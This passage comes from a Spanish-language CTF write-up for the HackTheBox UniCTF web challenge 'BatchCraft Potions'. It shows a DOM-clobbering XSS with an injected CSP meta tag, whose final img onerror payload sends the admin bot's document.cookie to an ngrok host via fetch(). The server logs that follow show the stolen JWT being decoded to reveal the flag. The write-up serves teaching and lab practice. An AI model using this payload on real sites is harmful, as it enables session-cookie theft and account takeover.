class="mtk1"> </span><span class="mtk8">data-category</span><span class="mtk1">=</span><span class="mtk4">"{{ </span><span class="mtk1">product</span><span class="mtk4">.</span><span class="mtk1">product_category</span><span class="mtk4"> }}"</span><span class="mtk1">&gt;</span>  
</code></pre></div><p>No podemos simplemente agregar otro elemento HTML que contenga el atributo <code>data-category</code> porque el anterior se carga primero, por lo que jQuery solo usará ese.</p><p>El objetivo es controlar la propiedad <code>id</code> de cualquier elemento de <code>potionTypes[i]</code>. JavaScript a veces es extraño, y esto se puede hacer con este <em>payload</em>:</p><p><img src="/images/other/HTB%20UniCTF/BatchCraft-Potions-14.png" alt="BatchCraft Potions 14"></p><p>Dado que estamos obligados a usar <code>name="potionTypes"</code> en la etiqueta <code>img</code> para controlar el objeto <code>window</code> y controlar el atributo <code>id</code> (véase <a href="https://www.securebinary.in/blog/web/art-of-dom-clobbering">www.securebinary.in</a>), la única forma en que podemos inyectar HTML es en el atributo <code>src</code>. Podemos probar algo como esto, usando esquema <code>cid:</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk1">r</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">s</span><span class="mtk1">.</span><span class="mtk8">post</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'</span><span class="mtk4 detected-link">http://</span><span class="mtk6 detected-link">{</span><span class="mtk1 detected-link">host</span><span class="mtk6">}</span><span class="mtk4">/api/products/add'</span><span class="mtk1">, </span><span class="mtk9 mtki">json</span><span class="mtk5">=</span><span class="mtk1">{</span>
<span class="mtk1">        </span><span class="mtk4">'product_name'</span><span class="mtk1">: </span><span class="mtk4">'asdf'</span><span class="mtk1">,</span>
<span class="mtk1">        </span><span class="mtk4">'product_desc'</span><span class="mtk1">: </span><span class="mtk4">'''&lt;a id="potionTypes"&gt;&lt;/a&gt;&lt;img id="1" name="potionTypes" src="cid:x<span class="mtk6">\\</span>' onerror='alert(123)'"&gt;'''</span><span class="mtk1">,</span>
<span class="mtk1">        </span><span class="mtk4">'product_price'</span><span class="mtk1">: </span><span class="mtk4">'123'</span><span class="mtk1">,</span>
<span class="mtk1">        </span><span class="mtk4">'product_category'</span><span class="mtk1">: </span><span class="mtk4">'1'</span><span class="mtk1">,</span>
<span class="mtk1">        </span><span class="mtk4">'product_keywords'</span><span class="mtk1">: </span><span class="mtk4">'asdf'</span><span class="mtk1">,</span>
<span class="mtk1">        </span><span class="mtk4">'product_og_title'</span><span class="mtk1">: </span><span class="mtk4">'fdsa'</span><span class="mtk1">,</span>
<span class="mtk1">        </span><span class="mtk4">'product_og_desc'</span><span class="mtk1">: </span><span class="mtk4">'''script-src 'unsafe-inline' http://127.0.0.1:1337/static/js/product.js http://127.0.0.1:1337/static/js/jquery.min.js" http-equiv="Content-Security-Policy'''</span><span class="mtk1">,</span>  
<span class="mtk1">    })</span>
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> 127.0.0.1:1337 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InZlbmRvcjUzIiwidmVyaWZpZWQiOnRydWUsImlhdCI6MTY3MDM0MTcxNH0.8rAyX5qbFYtOU4Fms6pvm7LBIlkkP3rlzUcvZq1G-nM  
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InZlbmRvcjUzIiwidmVyaWZpZWQiOnRydWUsImlhdCI6MTY3MDM0MTcxNH0.8rAyX5qbFYtOU4Fms6pvm7LBIlkkP3rlzUcvZq1G-nM
{"message":"Potion added and being reviewed by admin!"}
</code></pre></div><p><img src="/images/other/HTB%20UniCTF/BatchCraft-Potions-15.png" alt="BatchCraft Potions 15"></p><p>Así es como el DOM fue modificado:</p><p><img src="/images/other/HTB%20UniCTF/BatchCraft-Potions-16.png" alt="BatchCraft Potions 16"></p><p>Increíble&mldr; Ahora podemos ingresar un código JavaScript para robar la <em>cookie</em> del <em>bot</em>. Podemos usar <code>ngrok</code> para exponer públicamente nuestro servidor HTTP local:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -m http.server 80
Serving HTTP on :: port 80 (http://[::]:80/) ...  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ngrok</span> http 80

<span class="code-cyan">ngrok</span>

<span class="code-dark-magenta">Join us in the ngrok community @ https://ngrok.com/slack</span>

<span class="code-dark-green">Session Status                online</span>
<span class="code-dark-white">Account                       Rocky (Plan: Free)</span>
<span class="code-dark-white">Version                       3.1.0</span>
<span class="code-dark-white">Region                        United States (us)</span>
<span class="code-dark-white">Latency                       -</span>
<span class="code-dark-white">Web Interface                 http://127.0.0.1:4040</span>
<span class="code-dark-white">Forwarding                    https://abcd-12-34-56-78.ngrok.io -&gt; http://localhost:80</span>  

<span class="code-dark-white">Connections                   ttl     opn     rt1     rt5     p50     p90</span>
<span class="code-dark-white">                              0       0       0.00    0.00    0.00    0.00</span>
</code></pre></div><p>Este es el <em>payload</em> final que hará que el <em>bot</em> nos envíe su <em>cookie</em>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk1">r</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">s</span><span class="mtk1">.</span><span class="mtk8">post</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'</span><span class="mtk4 detected-link">http://</span><span class="mtk6 detected-link">{</span><span class="mtk1 detected-link">host</span><span class="mtk6">}</span><span class="mtk4">/api/products/add'</span><span class="mtk1">, </span><span class="mtk9 mtki">json</span><span class="mtk5">=</span><span class="mtk1">{</span>
<span class="mtk1">        </span><span class="mtk4">'product_name'</span><span class="mtk1">: </span><span class="mtk4">'asdf'</span><span class="mtk1">,</span>
<span class="mtk1">        </span><span class="mtk4">'product_desc'</span><span class="mtk1">: </span><span class="mtk4">'''&lt;a id="potionTypes"&gt;&lt;/a&gt;&lt;img id="1" name="potionTypes" src="cid:x<span class="mtk6">\\</span>' onerror='fetch(`http://abcd-12-34-56-78.ngrok.io/`+document.cookie,{mode:`no-cors`})'"&gt;'''</span><span class="mtk1">,</span>  
<span class="mtk1">        </span><span class="mtk4">'product_price'</span><span class="mtk1">: </span><span class="mtk4">'123'</span><span class="mtk1">,</span>
<span class="mtk1">        </span><span class="mtk4">'product_category'</span><span class="mtk1">: </span><span class="mtk4">'1'</span><span class="mtk1">,</span>
<span class="mtk1">        </span><span class="mtk4">'product_keywords'</span><span class="mtk1">: </span><span class="mtk4">'asdf'</span><span class="mtk1">,</span>
<span class="mtk1">        </span><span class="mtk4">'product_og_title'</span><span class="mtk1">: </span><span class="mtk4">'fdsa'</span><span class="mtk1">,</span>
<span class="mtk1">        </span><span class="mtk4">'product_og_desc'</span><span class="mtk1">: </span><span class="mtk4">'''script-src 'unsafe-inline' http://127.0.0.1/static/js/product.js http://127.0.0.1/static/js/jquery.min.js" http-equiv="Content-Security-Policy'''</span><span class="mtk1">,</span>
<span class="mtk1">    })</span>
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> 127.0.0.1:1337 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InZlbmRvcjUzIiwidmVyaWZpZWQiOnRydWUsImlhdCI6MTY3MDM0MTcxNH0.8rAyX5qbFYtOU4Fms6pvm7LBIlkkP3rlzUcvZq1G-nM  
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InZlbmRvcjUzIiwidmVyaWZpZWQiOnRydWUsImlhdCI6MTY3MDM0MTcxNH0.8rAyX5qbFYtOU4Fms6pvm7LBIlkkP3rlzUcvZq1G-nM
{"message":"Potion added and being reviewed by admin!"}
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -m http.server 80
Serving HTTP on :: port 80 (http://[::]:80/) ...
::1 - - [] code 404, message File not found
::1 - - [] "GET /session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwidmVyaWZpZWQiOnRydWUsImZsYWciOiJIVEJ7ZjRrM19mbDRnX2Ywcl90M3N0MW5nfVxuIiwiaWF0IjoxNjcwMzUwODg1fQ.3Sk9_oyQCe6-F-kxhWF6ASiHQTtP8dprZ111r7_veLs HTTP/1.1" 404 -  
^C
Keyboard interrupt received, exiting.

<span class="code-cyan">$</span> <span class="code-dark-green">echo</span> eyJ1c2VybmFtZSI6ImFkbWluIiwidmVyaWZpZWQiOnRydWUsImZsYWciOiJIVEJ7ZjRrM19mbDRnX2Ywcl90M3N0MW5nfVxuIiwiaWF0IjoxNjcwMzUwODg1fQ | <span class="code-dark-green">base64</span> -d
{"username":"admin","verified":true,"flag":"HTB{

<span class="code-cyan">$</span> <span class="code-dark-green">echo</span> eyJ1c2VybmFtZSI6ImFkbWluIiwidmVyaWZpZWQiOnRydWUsImZsYWciOiJIVEJ7ZjRrM19mbDRnX2Ywcl90M3N0MW5nfVxuIiwiaWF0IjoxNjcwMzUwODg1fQ= | <span class="code-dark-green">base64</span> -d
{"username":"admin","verified":true,"flag":"HTB{

<span class="code-cyan">$</span> <span class="code-dark-green">echo</span> eyJ1c2VybmFtZSI6ImFkbWluIiwidmVyaWZpZWQiOnRydWUsImZsYWciOiJIVEJ7ZjRrM19mbDRnX2Ywcl90M3N0MW5nfVxuIiwiaWF0IjoxNjcwMzUwODg1fQ== | <span class="code-dark-green">base64</span> -d
{"username":"admin","verified":true,"flag":"HTB{f4k3_fl4g_f0r_t3st1ng}\n","iat":1670350885}
</code></pre></div><h2 id="_flag_"><em>Flag</em></h2><p>Ahora hagámoslo en la instancia remota:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> 178.62.84.158:32007
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InZlbmRvcjUzIiwidmVyaWZpZWQiOnRydWUsImlhdCI6MTY3MDM1MTAyOX0.egUuxRyzdtB9zmB05UHbhT69N5fwd3p_p6gleCglEtw  
{"message":"Potion added and being reviewed by admin!"}
</code></pre></div><p>Y allí recibimos el <em>token</em> JWT y tenemos la <em>flag</em>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -m http.server 80
Serving HTTP on :: port 80 (http://[::]:80/) ...
::1 - - [] code 404, message File not found
::1 - - [] "GET /session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwidmVyaWZpZWQiOnRydWUsImZsYWciOiJIVEJ7YjR0Y2hfbXlfcDA3MTBuNV93MTdoX3MwbTNfbTN0NF9tNGcxY30iLCJpYXQiOjE2NzAzNTEwMzB9.gYf1eyRWnidNYCDK4e9UbaMc3JbBuFBFWhwUZYeCu9A HTTP/1.1" 404 -  
^C
Keyboard interrupt received, exiting.

<span class="code-cyan">$</span> <span class="code-dark-green">echo</span> eyJ1c2VybmFtZSI6ImFkbWluIiwidmVyaWZpZWQiOnRydWUsImZsYWciOiJIVEJ7YjR0Y2hfbXlfcDA3MTBuNV93MTdoX3MwbTNfbTN0NF9tNGcxY30iLCJpYXQiOjE2NzAzNTEwMzB9 | <span class="code-dark-green">base64</span> -d
{"username":"admin","verified":true,"flag":"HTB{b4tch_my_p0710n5_w17h_s0m3_m3t4_m4g1c}","iat":1670351030}
</code></pre></div><p>El <em>script</em> completo se puede encontrar aquí: <a href="https://github.com/7Rocky/CTF-scripts/tree/main/HTB%20UniCTF/Web/BatchCraft%20Potions/solve.py"><code>solve.py</code></a>.</p><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#análisis-de-código-estático">Análisis de código estático</a><ul><li><a href="#implementación-de-la-base-de-datos">Implementación de la base de datos</a></li><li><a href="#implementación-de-otp">Implementación de OTP</a></li><li><a href="#rutas-disponibles">Rutas disponibles</a></li></ul></li><li><a href="#atacando-graphql">Atacando GraphQL</a><ul><li><a href="#desarrollo-del-_exploit_">Desarrollo del <em>exploit</em></a></li><li><a href="#más-análisis-de-código-fuente">Más análisis de código fuente</a></li></ul></li><li><a href="#ocasionando-un-xss">Ocasionando un XSS</a><ul><li><a href="#intentos-fallidos">Intentos fallidos</a></li><li><a href="#dom-_clobbering_">DOM <em>Clobbering</em></a></li><li><a href="#planeando-el-ataque">Planeando el ataque</a></li></ul></li><li><a href="#_flag_"><em>Flag</em></a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://tinyletter.com/7Rocky" method="post" target="popupwindow" onsubmit='return window.open("https://tinyletter.com/7Rocky","popupwindow","scrollbars=yes,width=800,height=600"),!0'><h3 class="tc">Recibe un resumen semanal del blog</h3><p class="tc"><label for="tlemail"></label></p><p class="tc"><input type="text" class="w-80 f5 pv3 ph3 bg-light-gray bn search" placeholder="Introduce tu correo electrónico" name="email" id="tlemail"></p><input type="hidden" value="1" name="embed">
<input style="display:none;color:var(--header)" type="submit" value="Suscribirse"><p class="tc">impulsado por <a href="https://tinyletter.com" target="_blank" title="tiniletter">TinyLetter</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; Blog de 7Rocky. Ciberseguridad y Mates 2023</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>